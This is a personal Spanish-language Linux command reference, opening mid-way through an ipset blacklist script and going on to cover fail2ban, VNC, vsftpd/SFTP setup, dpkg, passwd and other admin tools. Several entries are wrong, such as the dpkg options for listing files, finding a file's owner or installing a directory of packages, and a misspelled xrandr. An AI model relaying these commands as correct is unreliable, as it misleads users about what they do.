        echo -e "\nWarning: curl returned HTTP response code $HTTP_RC for URL $i"
    fi
    rm $IP_TMP
done
echo
sort $IP_BLACKLIST_TMP -n | uniq | sed -e '/^127.0.0.0\|127.0.0.1\|0.0.0.0/d'  > $IP_BLACKLIST
rm $IP_BLACKLIST_TMP
echo "Number of blacklisted IP/networks found: `wc -l $IP_BLACKLIST | cut -d' ' -f1`"
echo "create $IPSET_TMP_BLACKLIST_NAME -exist hash:net family inet hashsize $HASHSIZE maxelem $MAXELEM" > $IP_BLACKLIST_RESTORE
echo "create $IPSET_BLACKLIST_NAME -exist hash:net family inet hashsize $HASHSIZE maxelem $MAXELEM" >> $IP_BLACKLIST_RESTORE

egrep -v "^#|^$" $IP_BLACKLIST | while IFS= read -r ip
do
    echo "add $IPSET_TMP_BLACKLIST_NAME $ip" >> $IP_BLACKLIST_RESTORE
done

if [ -f $IP_BLACKLIST_CUSTOM ]; then
    egrep -v "^#|^$" $IP_BLACKLIST_CUSTOM | while IFS= read -r ip
    do
        echo "add $IPSET_TMP_BLACKLIST_NAME $ip" >> $IP_BLACKLIST_RESTORE
    done
    echo "Number of IP/networks in custom blacklist: `wc -l $IP_BLACKLIST_CUSTOM | cut -d' ' -f1`"
fi

echo "swap $IPSET_BLACKLIST_NAME $IPSET_TMP_BLACKLIST_NAME" >> $IP_BLACKLIST_RESTORE
echo "destroy $IPSET_TMP_BLACKLIST_NAME" >> $IP_BLACKLIST_RESTORE
ipset restore < $IP_BLACKLIST_RESTORE

 

Change permission.

sudo chmod +x /usr/local/bin/update-blacklist.sh

 
Configure Iptables.

Add ipset rule to iptables:

...
ipset create blacklist hash:net
iptables -I INPUT -m set --match-set blacklist src -j DROP
...

 
Configure cron.

sudo crontab -e

22 1 * * * /usr/local/bin/update-blacklist.sh

 
First run:

sudo /usr/local/bin/update-blacklist.sh

...

Number of blacklisted IP/networks found: 44129

 

Source:

https://github.com/trick77/ipset-blacklist
 

########################################################################################### fail2ban ########################################################################################

#### fail2ban

#### escanea logs como /var/log/auth.log y banea las ip con demasiados errores de conexion ####

fail2ban





#############################################################################################################################################################################################

############################################################################################# snort #########################################################################################

#### snort

#### snort es un sniffer de paquetes y un detector de intrusiones en una red (nids) ####

snort



#############################################################################################################################################################################################

############################################################################################ aide ###########################################################################################

#### aide

#### aide es un detector de intrusiones en un unico servidor, pc o host (hids) ####



#############################################################################################################################################################################################

########################################################################################## portsentry #######################################################################################

#### portsentry

#### portsentry es un ids que detecta escaneos de puertos y reacciona a un ataque. ####



#############################################################################################################################################################################################

############################################################################################# diff ##########################################################################################

#### diff

#### el comando diff nos permite comparar dos archivos linea a linea y nos informa de las diferencias entre ambos archivos. diff tiene muchas opciones. las que mas uso son -w, -q, -y. la sintaxis del comando es la siguiente: ####

diff [opciones] [archivo1] [archivo2]

#### si queremos comparar dos archivos, ignorando los espacios en blanco, utilizaremos el parametro -w: ####

diff -w archivo1 archivo2

#### si lo que queremos es que no nos muestre las diferencias, sino que tan solo nos informe de si son diferentes o no: ####

diff -q archivo1 archivo2

#### si queremos que nos muestre la salida con las diferencias marcadas a dos columnas: ####

diff -y archivo1 archivo2

#### como en muchos otros comandos, tambien podemos utilizar la opcion -i, que ignora la diferencia entre mayusculas y minusculas. ####

#### ignore white space while comparing with diff ####

diff -w name_list.txt name_list_new.txt

#### comprobar claves ssh publica y privada nota: tambien podemos utilizar colordiff ####

diff <(ssh-keygen -y -f ~/.ssh/id_rsa) <(cut -d' ' -f1,2 ~/.ssh/id_rsa.pub)



#### nota: ####

#### comparar dos archivos ignorando comentarios y lineas blancas ####

diff -u <(grep -ve '^(#|$)' file1) <(grep -ve '^(#|$)' file2)

#############################################################################################################################################################################################

########################################################################################### colordiff #######################################################################################

#### colordiff

#### colordiff es una muy buena aplicacion que podemos utilizar para comprar y ver las diferencias entre dos archivos. tambien existe un muy buen plugin para vim ####

colordiff archivo_1 archivo_2



#############################################################################################################################################################################################

############################################################################################ xrandr #########################################################################################

#### xrandr

#### comando para listar los monitores conectados reconocidos por mi sistema operativo xrandr ####

xrandr | awk '$2 ~ /^connected/'

#### comando para configurar un monitor como primario xrandr #### 

xandr --output $monitor --primary

#### comando para apagar un monitor que tengamos conectado a nuestro sistema operativo xrandr ####

xrandr --output $monitor --off

#### mostrar la resolucion de pantalla ####

xrandr -q | awk -f'current' -f',' 'nr==1 {gsub("( |current)","");print $2}'


#############################################################################################################################################################################################

############################################################################################# xfce ##########################################################################################

#### xfce

#### programa utilizado en xfce para gestionar los programas que se inician al inicio del sistema pudiendo tambien iniciar scripts o comandos gnome-session-properties ####

gnome-session-properties

#### tambien podemos agregar comandos o scripts en el archivo .profile que se iniciaran cada vez que nos logiemos en nuestro ordenador funcionaria como "start up application iniciar programas inicio de sesion seria como rc.local ####



#############################################################################################################################################################################################

############################################################################################# shopt #########################################################################################

#### shopt

#### tip para hacer que el comando "cd" sea mas inteligente y corrija y automaticamente 1 error de tipografia en el caso de que nos equivoquemos a tipear el nombre de un directorio al que queres entrar a el ####

shopt -s cdspell



#############################################################################################################################################################################################

############################################################################################## vnc ##########################################################################################

#### vnc

#### Que es VNC? VNC son las siglas en ingles de Virtual Network Computing en pocas palabras es un "protocolo" desarrollado para eso, permitir el acceso a maquinas de manera remota casi como si fuera de manera local... http://es.wikipedia.org/wiki/VNC ####

#### La instalacion ####

#### Instalarlo depende de como se instalen los paquetes en su sistema, incluso el nombre de los paquetes puede variar entre diferentes distribuciones, por lo que les muestro mas o menos los paquetes que instalarian en ArchLinux y lo demas es cosa de que busquen los simil en sus sistemas. ####

# pacman -S x11vnc ssh vnc

#### Despues, como el protocolo trabaja bajo una arquitectura cliente-servidor lo unico necesario es arrancar el servidor en la maquina a la cual queremos controlar, algo asi bastaria: ####

$ x11vnc -display :0 

#### Con lo que del otro lado (cliente) solo seria necesario acceder al servidor con un cliente (de los que tambien hay muchos), por comodidad yo utilizo el que viene por defecto: ####

$ vncviewer   - Y bueno despues de indicarle a este la ip de la maquina a la que desean acceder, si no hay problemas tendran una conexion exitosa, el cliente "vncviewer" es bastante estable y al menos a mi me resulta bastante fluido para trabajar tambien, les muestro como se ve cuando accedo de mi computadora de escritorio a mi lap

#### Como les dije con el comando anterior queda todo funcionando al 100, pero no habremos configurado nada de seguridad, y es es algo que no nos gusta a los que usamos Linux, por lo que bueno vamos a ver como le hariamos para agregarle una contrasena al servicio: ####

$ mkdir ~/.x11vnc
$ x11vnc -storepasswd password ~/.x11vnc/passwd

#### Con esto configuramos nuestra contrasena y bueno la forma de arrancar el servidor cambiaria un poco: ####

 $ x11vnc -display :0 -auth ~/.Xauthority -rfbauth ~/.x11vnc/passwd -many

Con lo que le decimos donde esta el pass y que acepte muchas conexiones remotas en lugar de solo una (-many), para mayor seguridad incluso podriamos tunelear el servicio por SSH y por comodidad tambien se puede crear un script con el arranque del servidor y agregarlo al inicio del sistema, como sea esto ya es gustos de cada quien, espero le sirva a alguien la informacion, que pues nunca esta de mas.

Aclaro a mi me gusta y me resulta mucho mas comodo acceder a una maquina por SSH, pero pues como les digo, no esta de mas.


#############################################################################################################################################################################################

############################################################################################# gitso #########################################################################################

#### gitso

#### programa para crear una coneccion vnc reversa gitso ####

gitso



#############################################################################################################################################################################################

########################################################################################### shutdown ########################################################################################

#### shutdown

#### para comprobar el estado del stema de archivo a rebootear shutdown ####

shutdown -fr now

#### apaga la maquina ####

shutdown -t1 -h now

#### reinicia la maquina ####

shutdown -t1 -r now

#### fsck al reiniciar ####

shutdown -rF now

#############################################################################################################################################################################################

############################################################################################# ftp ###########################################################################################

#### ftp #### sftp

#### los servidores ftp y sftp reconocen los mismos parametros se pueden utilizar los mismos comandos en estos servidores ####

#### para conectar a un servidor ftp hacemos ####

ftp ip/hostname

#### para descargar varios archivos una vez loegeados en un servidor ftp hacemos ####

ftp> mget *.html

#### para listar ver los archivos que tenemos en el servidor ftp antes de descargalos hacemos ####

ftp> mls *.html -

#### ftp(protocolo de transferencia de archivos) ####

#### conectar con el servidor ####

open servidor

#### imprimir informacion de ayuda local ####

?

#### anexar a un archivo ####

append

#### emitir sonido cuando se complete el comando ####

bell

#### establecer transferencia binaria (todas salvo .txt) ####

binary

#### finalizar la sesion ftp y salir ####

bye

#### establecer tipo de transferencia ascii (solo para .txt) ####

ascii

#### cambiar el directorio de trabajo remoto ####

cd

#### finalizar la sesion ftp ####

close

#### mostrar el contenido del directorio remoto ####

ls

#### mostrar el contenido del directorio remoto ####

dir

#### eliminar archivo remoto ####

delete

#### alternar modo de depuracion ####

debug

#### recibir archivo ####

get

#### ayuda sobre un comando 1?-help y luego el comando ####

help

#### cambiar el directorio de trabajo local ####

lcd

#### mostrar el contenido de multiples directorios remotos ####

mdir

#### eliminar multiples archivos ####

mdelete

#### obtener multiples archivos ####

mget

#### crear directorio en el equipo remoto ####

mkdir

#### mostrar el contenido de multiples directorios remotos ####

mls

#### enviar multiples archivos ####

mput

#### conectar a tftp remoto ####

open

#### enviar un archivo ####

put

#### imprimir el directorio de trabajo del equipo remoto ####

pwd

#### finalizar la sesion ftp y salir ####

quit

#### enviar un comando arbitrario ftp ####

quote

#### recibir archivo ####

recv

#### cambiar el nombre del archivo ####

rename

#### quitar directorio en el equipo remoto ####

rmdir

#### obtener ayuda del servidor remoto ####

remotehelp

#### enviar un archivo ####

send

#### muestra el estado actual ####

status

#### alternar trazado de paquetes ####

trace

#### establecer el tipo de transferencia de archivos ####

type

#### enviar nueva informacion de usuario ####

user

#### alternar modo detallado ####

verbose

#### Installing and configuring a ftp server in ubuntu 14.04

# FTP is used to transfer files from one host to another over TCP network. This article explains how to setup FTP server on ubuntu 14.04 There are 3 popular FTP server packages available PureFTPD, VsFTPD and ProFTPD. Here i’ve used VsFTPD which is lightweight and less Vulnerability.

# Step 1  Update repositories .

[email protected]:~$ sudo apt-get update

# Step 2  Install VsFTPD package using the below command.

[email protected]:~$ sudo apt-get install vsftpd

# Step 3 After installation open /etc/vsftpd.conf file and make changes as follows.

Uncomment the below lines (line no:29 and 33).
write_enable=YES
local_umask=022

# Uncomment the below line (line no: 120 ) to prevent access to the other folders outside the Home directory.

chroot_local_user=YES
and add the following line at the end.
allow_writeable_chroot=YES

# Add the following lines to enable passive mode.

pasv_enable=Yes
pasv_min_port=40000
pasv_max_port=40100

# Step 4  Restart vsftpd service using the below command.

[email protected]:~$ sudo service vsftpd restart

# Step 5  Now ftp server will listen on port 21. Create user with the below command.Use /usr/sbin/nologin shell to prevent access to the bash shell for the ftp users .

[email protected]:~$ sudo useradd -m john -s /usr/sbin/nologin
[email protected]:~$ sudo passwd john

# Step 6  Allow login access for nologin shell . Open /etc/shells and add the following line at the end.

/usr/sbin/nologin

# Now try to connect this ftp server with the username on port 21 using winscp or filezilla client and make sure that user cannot access the other folders outside the home directory. setup FTP server ubuntu 14.04

# Please note using ftp on port 21 is a big security risk . it’s highly recommended to use SFTP. Please continue for SFTP configuration Secure FTP ( SFTP )

# SFTP is called as “Secure FTP” which generally use SSH File Transfer Protocol . so we need openssh-server package installed , Issue the below command if it’s not already installed.

[email protected]:~$ sudo apt-get install openssh-server

# Step 7  Create a new group ftpaccess for FTP users.

[email protected]:~$ sudo groupadd ftpaccess

# Step 8  Now make changes in this /etc/ssh/sshd_config file. Find and comment the below line

Subsystem sftp /usr/lib/openssh/sftp-server

# And Add these lines at the end of the file.

Subsystem sftp internal-sftp
Match group ftpaccess
ChrootDirectory %h
X11Forwarding no
AllowTcpForwarding no
ForceCommand internal-sftp

# Step 9  Restart sshd service.

[email protected]:~$ sudo service ssh restart

# Step 10  The below steps must be followed while creating Users for sftp access. Create user john with ftpaccess group and /usr/bin/nologin shell.

[email protected]:~$ sudo useradd -m john -g ftpaccess -s /usr/sbin/nologin
[email protected]:~$ sudo passwd john
Change ownership for the home directory.
[email protected]:~$ sudo chown root /home/john
Create a folder inside home directory for writing and change ownership of that folder.
[email protected]:~$ sudo mkdir /home/john/www
[email protected]:~$ sudo chown john:ftpaccess /home/john/www

# Now try to connect server using SFTP ( port : 22 ) and makesure Users can upload files to www directory and cannot access other folders outside home directory.setup FTP server ubuntu 14.04If you want use both FTP and SFTP together, please perform above steps ( Step 10 ) while creating users . For existing users, move them to ftpaccess group and create folder structure and ownership changes as below.

[email protected]:~$ sudo usermod john -g ftpaccess -s /usr/sbin/nologin
[email protected]:~$ sudo chown root /home/john
[email protected]:~$ sudo mkdir /home/john/www
[email protected]:~$ sudo chown john:ftpaccess /home/john/www

Now john can able to upload files to www folder using FTP as well as SFTP


#### nota: "ncftp" es un cliente ftp (file transfer protocol) basado en ncurses ####

#### nota: "ftp-ssl" cliente ftp con soporte de cifrado ssl y tsl.(dependiendo de la otra parte) ####


#############################################################################################################################################################################################

############################################################################################ service ########################################################################################

#### service

#### para comprobar el estado de un servicio hacemos service ####

service servicio status

#### para comprobar el estado de todos los servicios corriendo hacemos services ####

service --status-all

#### para iniciar un servicio hacemos service ####

service servicio start 

#### para reiniciar un servicio hacemos service ####

service servicio restart

#### para detener un servicio hacemos service ####

service servicio stop



#############################################################################################################################################################################################

############################################################################################## dpkg #########################################################################################

#### dpkg

#### instalar / actualizar un paquete deb ####

dpkg -i package.deb

#### si se quiere instalar o actualizar un paquete .deb, se puede utilizar ####

dpkg -gi paquete-no-instalado.deb

#### eliminar un paquete deb del sistema ####

dpkg -r package_name

#### mostrar todos los paquetes deb instalados en el sistema ####

dpkg -l

#### mostrar todos los paquetes deb con el nombre "httpd" ####

dpkg -l | grep httpd

#### obtener informacion en un paquete especifico instalado en el sistema ####

dpkg -s package_name

#### mostar lista de archivos dados por un paquete instalado en el sistema ####

dpkg -l package_name

#### mostrar lista de archivos dados por un paquete no instalado todavia ####

dpkg --contents package.deb

#### verificar cual paquete pertenece a un archivo dado ####

dpkg -s /bin/ping

#### si se quiere ver un listado de los componentes que provee un paquete antes de ser instalado, se puede utilizar ####

dpkg -c paquete-no-instalado.deb

#### si solo se quiere desempaquetar el contenido sin instalar, se puede utilizar ####

dpkg -x paquete-no-instalado.deb

#### si se tiene un directorio lleno de paquetes .deb y se desea instalar todos estos, se puede utilizar lo siguiente ####

dpkg -r directorio/

#### si se desea presentar cualesquiera que sean las opciones de configuracion de un paquete, se puede utilizar ####

dpkg --configure paquete-no-instalado.deb

#### si se quiere desinstalar un paquete, incluyendo los archivos de configuracion, se puede utilizar ####

dpkg -p paquete

#### listar ver los kernels que tenemos instalados ####

dpkg --list | grep linux-image   - para eliminar kernels se debe utilizar apt-get para que tambien elimine las dependencias, dpkg no servira si queremos eliminar kernels



#### nota: archivo log donde se guarda la informacion importante de dpkg apt-get uptitdue etc ####

/var/log/dpkg.log

#### archivos que bloquean dpkg apt-get o aptitude cuando queremos instala un programa ya que no podemos instalar dos programas al mismo tiempo ####

sudo rm -f /var/lib/dpkg/lock

sudo rm -f /var/cache/apt/archives/lock

sudo rm -f /var/lib/apt/lists/lock

sudo rm -rf /var/cache/apt/archives/partial/

#############################################################################################################################################################################################

############################################################################################## free #########################################################################################

#### free

#### using free command: if you want to quickly check how many gb of ram your system has use the -g option. -b option displays in bytes, -k in kilo bytes, -m in mega bytes ####

free -m



#############################################################################################################################################################################################

############################################################################################## htop #########################################################################################

#### htop

#### htop para ver los precesos que pertenecen a determinado usuario podes utilizar el parametro -u asi ####

htop -u usuario



#############################################################################################################################################################################################

############################################################################################### df ##########################################################################################

#### df

#### para listar ver los dispositvos de almacenamiento que tenemos montado en el sistema utilizamos df y tenemos que pasarle dos parametros para que nos de valores (-h human erdible y -t type en gbs y el tipo de archivos ####

df -hT

# Get the disk usage of file system through a file  #

df groff.txt 

# Display inode information #

df -i

# Produce a grand total #

df --total

# comando preferido #

df -hT --total

#############################################################################################################################################################################################

############################################################################################## ls ###########################################################################################

#### ls

#### para ver las propiedades como permisos, atributos usuarios grupos a los que pertenecen, hora y fecha de su acceso o modificacion de los archivos ####

ls -l

#### para ver incluso archivos ocultos ####

ls -a

#### para ver el peso del archivo ####

ls -h

#### para listar ver solamente los directorios ####

ls -d */

#### muestra todos los archivos ocultos ####

ls .*

#### ls sin ls ####

for i in *; do echo $i; done

#### saber cuando fue la ultima vez que actualizamos ####

ls -hlst /var/cache/apt/ | awk '{print $7,$8}' | head -n 2



#############################################################################################################################################################################################

############################################################################################## mv ###########################################################################################

#### mv

#### un util parametro que le podemos pasar a mv es -v que nos mostrar que es lo que esta pasando al mover multiples varios archivo de un solo comando usando mv ####

mv -v carpeta_1/* carpeta_2/*

#### si a mv le pasamos el parametro -i este nos preguntara para que confirmemos el borrado de un archivo en el caso de que mv este por borrar un archivo en el que coincidan los nombre del archivo que esta siendo movido y el archivo a borrar ####

mv -i -v carpeta_1/* carpeta_2/*


#############################################################################################################################################################################################

############################################################################################## cp ###########################################################################################

#### cp

#### para copiar recursivamente un directorio preservando los permisos del mismo y sus enlaces simbolicos asi tambien como los enlaces duros ####

cp -dpr directorio_1/ directorio_2/

-r  # copia un directorio recursivamente,salvo los archivos especiales #

-p  # copia preservando permisos, propietario, grupos y fechas #

-d  # conserva los enlaces simbolicos como tales y preserva las relaciones de los duros #

-a  # con el parametro "-a" es lo mismo que tipear -dpr #


#### Exclude file/folder with cp command ####

cp -r `ls | grep -v "exclude"` $HOME/

for object in `ls bla/ | grep -v test_1.txt` ; do cp -a bla/$object destination ; done

#############################################################################################################################################################################################

############################################################################################## ln ###########################################################################################

#### ln

#### para crear un enlace duro (con el mismo inodo,es decir mismo archivo con distintos nombres) ####

ln ruta_archivo ruta_enlace

#### para crear un enlace simbolico (con diferente inodo,es decir se crea un nuevo archivo que apunta a el \"apuntado\", permitiendo enlazar con directorios y con archivos de otro sistema de archivos) ####

ln -s ruta_directorio ruta_enlace



#############################################################################################################################################################################################

############################################################################################ touch ##########################################################################################

#### touch

#### touch nos sirve para interactuar con los meradatos de los archivos como fecha de acceso, modificacion e inclusive podemos crear un archivo con 0 bytes ####

#### para crear un archivo 0 bytes con la fecha actual ####

touch archivo

#### para cambia las fechas de acceso "-a" y/o modificacion "-m" de un archivo "-t" stamp ####

touch -am -t archivo

touch -am -t 0604031433.30 fich
             aammddhhmm.ss -------> si no se especifican los segundos,tomaria 0 como valor



#############################################################################################################################################################################################

############################################################################################ passwd #########################################################################################

#### passwd #### pwck #### pwconv #### shadow

#### passwd 

#### para cambiar tu pasword contrasena utilzando passwd hacemos ####

passwd

#### el administrador del sistema o un usuario con permisos de admin puede cambiar el pasword contrasena de otros usuarios sin pregunta cual era la contrasena a cambiar asi passwd ####

passwd nombredeusuario

#### si removemos el password contasena de un usuario este podria logearse sin la necesidad de escribir una contrasena asi passwd ####

passwd -d nombredeusuario

#### para bloquear la contrasena de un usuario haciendo que este no se pueda logear con passwd hacemos ####

passwd -l usuario


#### pwck


#### a veces creamos, borramos o modificamos usuarios de forma manual, tocando los archivos /etc/passwd y /etc/shadow, como por ejemplo, si tenes que clonar servidores, esto, a veces, genera$

pwck   - paswords contrasena usuarios

#### una opcion interesante de pwck, para cuando tenemos ambos archivos un poco desordenados es -s "pwck -s" nos ordenara las entradas de ambos archivos por uid pasword contrasena usuarios #$

pwck -s   - password contrasena usuarios


#### pwconv


#### otro comando muy util cuando tenemos problemas con los archivos de usuarios es "pwconv" cuando lo ejecutamos, comprueba si existe el archivo /etc/shadow. si existe, lo renombra a /etc/s$

pwconv    - password contrasena usuarios



#### rm-rm ####

# Cómo encontrar fallos e inconsistencias en los ficheros passwd y shadow #

Linux passwordExiste un comando llamado pwck que mediante su ejecución verifica que la información contenida en los ficheros de autenticación /etc/passwd y /etc/shadow es correcta. Básicamente comprueba el número de campos en cada una de las entradas de los ficheros, verifica la existencia de los campos de login, UID y GID además de revisar que el directorio home de cada usuario existe y la shell que utiliza.

Su ejecución es simple, ejecutamos como root el comando y examinamos la salida, en este ejemplo vemos inconsistencia con los directorios home de varios usuarios (no existen:

# pwck
usuario «lp»: directorio «/var/spool/lpd» no existe
usuario «news»: directorio «/var/spool/news» no existe
usuario «uucp»: directorio «/var/spool/uucp» no existe
usuario «www-data»: directorio «/var/www» no existe
pwck: sin cambios

Si por ejemplo pusiéramos una shell incorrecta al usuario www-data nos avisaría del fallo:

# pwck
usuario «www-data»: directorio «/var/www» no existe
usuario «www-data»: programa «/bin/shtest» no existe

Podemos probar (¡no lo hagáis con usuarios importantes o en servidores en producción!)a eliminar la columna del grupo en el usuario. pwck nos avisará y de forma activa nos indicará si queremos eliminar la línea incorrecta:

# pwck
entrada del archivo de contraseñas no válida
¿eliminar la línea «www-data:x:33::www-data:/var/www:/bin/sh»? no
ninguna entrada del fichero de contraseñas concuerda con /etc/passwd
¿eliminar la línea «www-data:*:14889:0:99999:7:::»? no

Si aceptamos las modificaciones nos indicará que se han realizado cambios en los archivos:

pwck: los archivos se han actualizado

Os recomiendo complementar esta entrada leyendo el artículo visudo, vipw y vigr: editando ficheros críticos en Linux de forma segura

#############################################################################################################################################################################################

############################################################################################ uname ##########################################################################################

#### uname

#### uname muestra informacion sobre el kernel e informacion basica del sistema operativo que estamos usando ####

uname -a = muestra toda la informacion sobre el kernel y sistema operativo que se esta utilizando.
uname -m = muestra el tipo de arquitectura que se esta utilizando.
uname -s = muestra el nombre del sistema. operativo
uname -n = muestra el nombre por el que se identifica el sistema operativo en la red.
uname -r = muestra la revision (release) del kernel que estamos usando.
uname -v = muestra la version del kernel que estamos usando

#### para ver la informacion importante ralacionada con nuestro kernel utilizamos el comando uname -mr en vez de uname -a que mostraria un monton de informacion no tan importante ####

uname -mr

#### para ver la version de kernel el nombre de la maquina el tipo de arquitectura del kernel etc que estamos usando usamos uname asi ####

uname -a



#############################################################################################################################################################################################

########################################################################################### whereis #########################################################################################

#### whereis

#### si queres buscar donde se encuentra alojado el binario que ejecuta un comando indicado utilizamos whereis asi

whereis comando

#### si queremos busca donde se ecuentra aloja un binario fuera del path usando whereis es ####

whereis -u -b carpeta -f lsmk



#############################################################################################################################################################################################

############################################################################################ type ###########################################################################################

#### type

#### type muestra minima informacion sobre un comando junto con la ubicacion del mismo ####

type comando



#############################################################################################################################################################################################

########################################################################################### whatis ##########################################################################################

#### whatis

#### si queremos tener un leve detalle de lo que hace un comando especifico podemos utilizar whatis ####

whatis comando



#############################################################################################################################################################################################

############################################################################################## fc ###########################################################################################

#### fc

#### fc muestra el historial de los comandos utilizados ####

#### para ver nuestros ultimos 16 comandos utilizados ####

fc -l



#############################################################################################################################################################################################

############################################################################################# eject #########################################################################################

#### eject

#### con eject podemos remover o extrar dispositivos de almacenamiento extraibles ####

#### para ver el dispositivo de almacenamiento a extraer por default ####

eject -d

#### para extrar el dispositivo de almacenamiento por default ####

eject

#### para extraer la bandeja del cdrom dvdrom ####

eject sr0

#### para cerrar la bandeja del cdrom dvdrom

eject -t sr0

#### remontar un usb sin tener que desconectarlo ####

eject /dev/sdb ; sleep 1 ; eject -t /dev/sdb


#############################################################################################################################################################################################

############################################################################################# tail ##########################################################################################

#### tail

#### con el comando tail podes ver listar las ultimas 10 lineas de un archivo por default ####

tail archivo.txt

#### si quisieramos ver mas lineas del mismo archivo con tail debemos agregar el parametro -n asi ####

tail -n numerodelineasaver archivo.txt

#### un util parametro que le podemos pasar a tail es -f que nos permitira ver en tiempo real un archivo log que continua creciendo asi ####

tail -f /var/log/archivo.log

#### observar quien entra a que paginas con apache.log ####

tail -f access.log | awk '{print $1 , $12}'


#############################################################################################################################################################################################

############################################################################################# less ##########################################################################################

#### less

#### el comando less tambien es util para ver logs en tiempo real ####

less /var/log/archivo.log   - ctrl+f - forward one window   ctrl+b - backward one window

#### mensajes del nucleo (solo root o algun usuario que pertenesca al grupo adm tiene acceso a los logs) ####

less /var/log/kern.log

#### registro de mensajes relativos a la seguridad ####

less /var/log/syslog

#### registro de informacion de depuracion de los programas ####

less /var/log/debug

#### mensajes del sistema de caracter informativo ####

less /var/log/messages

#### informacion del usuario ####

less /var/log/user.log

#### informacion sobre el servidor x ####
 
less /var/log/xorg.0.log

#### accesos al sistema(incluye los intentos fallidos) ####

less /var/log/auth.log



#############################################################################################################################################################################################

############################################################################################## su ###########################################################################################

#### su

#### el comando "su" es muy bueno si sos el usuario root con el comando su podes cambiar a cualquier usuario sin tener que entrar una contrasena ####

su - usuario

#### si somos root o si tenemos permisos de admin tambien podriamos con el comando "su" ejecutar comandos como si fueramos otro usuario por ejemplo ####

su - curiousx -c 'ls'

#### si somos root o tenemos permisos de admin tambien podes ejecutar una shell en concreto y como un usuario en concreto por ejemplo ####

su -s '/bin/bash' curiousx



#############################################################################################################################################################################################

############################################################################################# date ##########################################################################################

#### date

#### para establecer la fecha y la hora en un sistema con el comando date hacemos ####

date -s "01/31/2010 23:59:53"

#### muestra la fecha y hora en formato utc(tiempo universal coordinado) ####

date -u


#############################################################################################################################################################################################

############################################################################################ hwclock ########################################################################################

#### hwclock

#### para ver la hora del reloj harware (tambien llamado reloj de la bios y reloj cmos) ####

hwclock --show

#### para sincronizar el reloj harware con la hora del sistema ####

hwclock -systohc



#############################################################################################################################################################################################

############################################################################################ ntpdate ########################################################################################

#### ntpdate

#### ajustar directamente la hora del sistema sincronizandola con la de un servidor ntp ####

ntpdate servidor ntp



#############################################################################################################################################################################################

############################################################################################# ntpd ##########################################################################################

#### ntpd

#### ntpd es un servicio o demonio que ajusta el reloj de forma gradual sincronizandolo con servidores ntp ####



#############################################################################################################################################################################################

########################################################################################## lsb_release ######################################################################################

#### lsb_release

#### si al comando lsb_release le pasamos el parametro -d podemos ver la version del sistema operativo ubuntu que estemos usando ####

lsb_release -d



#############################################################################################################################################################################################

############################################################################################ nohup ##########################################################################################

#### nohup

#### para ejecuter una aplicacion desde la terminal en segundo plano "&" y para que no se cierre al cerrar la terminal o sea el proceso padre que incio el programa usamos ####

nohup comando &



#############################################################################################################################################################################################

############################################################################################ blkid ##########################################################################################

#### blkid

#### comando para ver uuid uuid identificadores de particiones, junto con su label etiqueta nombre del disposito y el tipo del sistema de archivos ####

blkid



#############################################################################################################################################################################################

########################################################################################### zeitgeist #######################################################################################

#### zeitgeist

#### comando para reiniciar el servidor zeigeist ####

zeitgeist-daemon --replace

#### archivo base de datos donde zeitgeist almacena la informacion ####

.local/share/zeitgeist/activity.sqlite



#############################################################################################################################################################################################

############################################################################################ strace #########################################################################################

#### strace

#### hace unos meses vimos como hacer debug de procesos en solaris con el comando truss y dije ademas que este comando era la alternativa a strace en gnu/linux. vamos a ver entonces las posibilidades que nos ofrece el comando strace. nos permite visualizar en la salida estandar los errores, llamadas al sistema y senales que recibe el proceso. esto implica ver todo el proceso de ejecucion de un proceso desde que comienza hasta que termina a bajo nivel ####

#### hay dos formas muy sencillas de ejecutarlo, una es strace <comando> para lanzar y analizar un programa que no este en ejecucion en ese momento y la otra, strace -p <pid> para conectarnos a un proceso ya existente ####

#### iniciamos y analizamos gnome-terminal ####

strace gnome-terminal

#### nos conectamos a un programa mediante su pid para debug usando strace ####

strace -p $pid

#### tambien podriamos evitar ver toda la salida directa por pantalla y mostrar con el parametro "-c" un resumen de las llamadas y errores durante la ejecucion ####

strace -c date

#### mostrar las llamadas a la biblioteca ####

strace -f -e open ls >/dev/null



#############################################################################################################################################################################################

########################################################################################### ltrace ##########################################################################################

#### ltrace

#### ltrace traceador de librerias dinamicas utilizadas en la ejecucion de un comando ####



#############################################################################################################################################################################################

########################################################################################### readelf #########################################################################################

#### readelf

#### readelf muestra informacion sobre binarios elf ####

-h (info de la cabecera))
-l (info de la program header)
-s (info de la section header)
-e (equivalente a -h -l -s)
-s (tabla de simbolos)


#############################################################################################################################################################################################

############################################################################################ string #########################################################################################

#### string

#### string es un comando que imprime las cadenas de caracteres de un binario. (imprime tb trozos de la tabla de simbolos)



#############################################################################################################################################################################################

############################################################################################ ulimit #########################################################################################

#### ulimit ####

#### ulimit es un comando interno que nos puede servir para establecer limites a los recursos del sistema ####

-c (tamanyo de archivos core)
-u (cantidad maxima de procesos)
-f (tamanyo maximo de un archivo)
-v (tamanyo maximo de la memoria virtual)



#############################################################################################################################################################################################

############################################################################################# awk ###########################################################################################

#### awk

#### awk busca ciertos patrones en la entrada, y la procesa de la manera especificada. awk tiene una gran funcionalidad, pero esta mayor funcionalidad tiene su coste reflejado en una mayor complejidad del lenguaje. awk dispone de un lenguaje completo, sintacticamente similar a c que tiene una gran potencia a la hora de reconocer patrones en la entrada, ya que permite especificar combinaciones de expresiones regulares. ademas, no es necesario procesar la entrada linea a linea. awk permite escoger el caracter que indica el fin de un registro y procesar la entrada de registro en registro (en el lenguaje awk, un 'registro' es el equivalente a una 'linea'). awk separa automaticamente cada registro en campos que pueden utilizarse individualmente. por defecto, un registro es una linea del archivo, lo que significa que el separador de registros es '\n'. por defecto, un campo es todo aquello que este separado por espacios en blanco, es decir, una palabra. el separador de campos por defecto es '[ \t]' (espacio y tabulador). un programa de awk es una secuencia de sentencias patron-accion, con un formato determinado, en el que las acciones se ejecutaran si en el registro actual se cumple el patron. el formato es el siguiente: patron {accion} suele ser necesario encerrar los programas de awk entre comillas, para evitar que el shell las interprete como caracteres especiales. hay que tener en cuenta dos cosas: * si no hay patron, las acciones se ejecutan en todos los registros. * si no hay acciones, lo que se hace es ejecutar la accion por defecto, que es copiar el registro en la salida estandar. ####

